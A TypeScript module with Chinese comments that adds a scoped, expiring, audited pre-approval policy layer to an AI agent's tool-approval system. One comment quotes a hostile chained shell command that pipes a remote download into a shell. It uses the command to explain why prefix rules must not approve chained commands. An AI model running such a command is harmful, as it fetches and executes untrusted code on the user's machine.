import fs from 'node:fs';
import path from 'node:path';
import type { ApprovalDecision, ApprovalRequest, Approver, RiskLevel } from './types.ts';
import { memorable, toDecision } from './types.ts';

/**
 * 预先允许的策略。
 *
 * 为什么需要它：`RememberingApprover` 的「始终允许」只活在**当前会话**里
 * （`--resume` 能从事件流还原，开新会话就没了）。实际用起来，同一个仓库里
 * `npm test`、`read src/**` 这类操作每开一个会话就要重批一遍。
 * 而"每次都问"的代价不是烦——是人会直接上 `GB_APPROVE=all`，
 * 那前面所有的分级、硬拒绝、关键文件保护就一起废了。
 *
 * 所以这不是把闸门放宽，是**把放宽这件事本身做成可声明、有边界、可审计的**：
 * - 作用域：必须指定工具名，可以再限定首个字符串参数的前缀；
 * - 上限：一条规则最多能预批到什么风险等级，默认只到 `confirm`；
 * - 过期：`until` 到期后规则自动失效，不留永久后门；
 * - 不可覆盖：`deny` 永远不进这条路（Loop 在审批之前就硬挡了），
 *   而且策略文件里写 `maxLevel: "deny"` 会被**当成错误拒绝**，不是静默忽略；
 * - 可审计：每次因策略放行都发一条 `approval.policy`，写明命中了哪条规则。
 */
export interface PolicyRule {
  /** 工具名，必填。不支持通配——"所有工具"这种规则等于没有边界 */
  tool: string;
  /** 首个字符串参数必须以此开头（如 `npm test`、`src/`）。不给则该工具的任何参数都算命中 */
  argPrefix?: string;
  /**
   * 这条规则最多能预批到哪一级，默认 `confirm`。
   * 想预批 `dangerous` 必须显式写出来——那一级的定义就是"很危险，问人"，
   * 让它悄悄地被一条默认值放过去是不对的。
   */
  maxLevel?: 'confirm' | 'dangerous';
  /** 到期日（`YYYY-MM-DD` 或任何 Date 认的写法）。过期即失效 */
  until?: string;
  /** 为什么加这条。会出现在审计事件里 */
  reason?: string;
}

/** 风险等级的高低顺序。只用于比较，不含 `deny`——它压根不走策略这条路 */
const LEVEL_ORDER: Record<'safe' | 'confirm' | 'dangerous', number> = {
  safe: 0,
  confirm: 1,
  dangerous: 2,
};

export interface PolicyLoad {
  rules: PolicyRule[];
  /** 读取/校验过程中的问题。**必须被打印出来**：安全配置静默失效比没有配置更糟 */
  errors: string[];
}

/** 策略文件在工作区里的位置 */
export function policyPath(workspace: string): string {
  return path.join(workspace, '.glassbox', 'policy.json');
}

/**
 * 读并校验策略文件。文件不存在是正常情况（返回空规则、无错误）。
 *
 * 校验失败的规则一律**丢弃并报错**，不做"尽力理解"：
 * 一条写错的安全规则如果被猜着执行，比它根本不生效更危险。
 */
export function readPolicy(workspace: string): PolicyLoad {
  const file = policyPath(workspace);
  if (!fs.existsSync(file)) return { rules: [], errors: [] };

  let parsed: unknown;
  try {
    parsed = JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch (e) {
    return { rules: [], errors: [`policy.json 解析失败，本次不启用任何预先允许：${(e as Error).message}`] };
  }

  const raw = (parsed as { rules?: unknown })?.rules;
  if (!Array.isArray(raw)) {
    return { rules: [], errors: ['policy.json 缺少 rules 数组，本次不启用任何预先允许'] };
  }

  const rules: PolicyRule[] = [];
  const errors: string[] = [];
  raw.forEach((item, i) => {
    const r = item as Record<string, unknown>;
    const at = `rules[${i}]`;
    if (typeof r?.tool !== 'string' || r.tool.trim() === '') {
      errors.push(`${at} 缺少 tool，已忽略——不指定工具的规则等于没有作用域`);
      return;
    }
    if (r.maxLevel !== undefined && r.maxLevel !== 'confirm' && r.maxLevel !== 'dangerous') {
      // 特别点出 deny：这是最可能有人尝试的写法，也是最需要明确拒绝的
      const extra = r.maxLevel === 'deny' ? '；deny 不可被任何策略覆盖' : '';
      errors.push(`${at} maxLevel 只能是 confirm 或 dangerous，实际是 ${JSON.stringify(r.maxLevel)}，已忽略${extra}`);
      return;
    }
    if (r.until !== undefined && (typeof r.until !== 'string' || Number.isNaN(Date.parse(r.until)))) {
      errors.push(`${at} until 不是能识别的日期（${JSON.stringify(r.until)}），已忽略`);
      return;
    }
    if (r.argPrefix !== undefined && typeof r.argPrefix !== 'string') {
      errors.push(`${at} argPrefix 必须是字符串，已忽略`);
      return;
    }
    rules.push({
      tool: r.tool,
      argPrefix: r.argPrefix as string | undefined,
      maxLevel: (r.maxLevel as 'confirm' | 'dangerous' | undefined) ?? 'confirm',
      until: r.until as string | undefined,
      reason: typeof r.reason === 'string' ? r.reason : undefined,
    });
  });
  return { rules, errors };
}

/** 请求里首个字符串参数（和审批记忆键取的是同一个东西） */
function firstStringArg(req: ApprovalRequest): string | undefined {
  const first = Object.values(req.args ?? {}).find((v) => typeof v === 'string');
  return typeof first === 'string' ? first.trim() : undefined;
}

/** 找出命中这个请求的第一条规则；没有就 undefined */
export function matchRule(
  rules: readonly PolicyRule[],
  req: ApprovalRequest,
  now: number = Date.now(),
): PolicyRule | undefined {
  /**
   * 复用 `memorable()` 这道闸：它排掉 `noMemory` 的请求。
   *
   * 这一条不是顺手加的。`shellPlugin` 给组合命令（`npm test && curl x | sh`）标了
   * `noMemory`，正是为了让它匹配不到"批准过 npm test"这类记忆。策略如果不认这个标记，
   * 一条 `argPrefix: "npm test"` 就会把任意拼接命令一起放过去——
   * 那就等于用配置文件绕开了 shellPlugin 的收口。
   */
  if (!memorable(req)) return undefined;
  const level: RiskLevel = req.level;
  if (level !== 'confirm' && level !== 'dangerous' && level !== 'safe') return undefined;

  return rules.find((rule) => {
    if (rule.tool !== req.toolName) return false;
    if (LEVEL_ORDER[level] > LEVEL_ORDER[rule.maxLevel ?? 'confirm']) return false;
    if (rule.until !== undefined && now > Date.parse(rule.until)) return false;
    if (rule.argPrefix !== undefined) {
      const arg = firstStringArg(req);
      if (arg === undefined || !arg.startsWith(rule.argPrefix)) return false;
    }
    return true;
  });
}

/**
 * PolicyApprover：命中策略就直接放行，否则交给内层（问人 / 自动策略）。
 *
 * 包在 `RememberingApprover` 外面：策略是"预先声明的"，会话记忆是"临时答出来的"，
 * 前者先判。`deny` 走不到这里——Loop 在请求审批之前就挡掉了。
 */
export class PolicyApprover implements Approver {
  private readonly inner: Approver;
  private readonly rules: readonly PolicyRule[];
  private readonly onGrant?: (rule: PolicyRule, req: ApprovalRequest) => void;

  constructor(
    inner: Approver,
    rules: readonly PolicyRule[],
    onGrant?: (rule: PolicyRule, req: ApprovalRequest) => void,
  ) {
    this.inner = inner;
    this.rules = rules;
    this.onGrant = onGrant;
  }

  async decide(req: ApprovalRequest): Promise<ApprovalDecision> {
    const rule = matchRule(this.rules, req);
    if (rule) {
      // 审计不是可选项：一次没人看见的放行，和没有闸门是一样的
      this.onGrant?.(rule, req);
      return 'allow';
    }
    return toDecision(await this.inner.decide(req));
  }
}
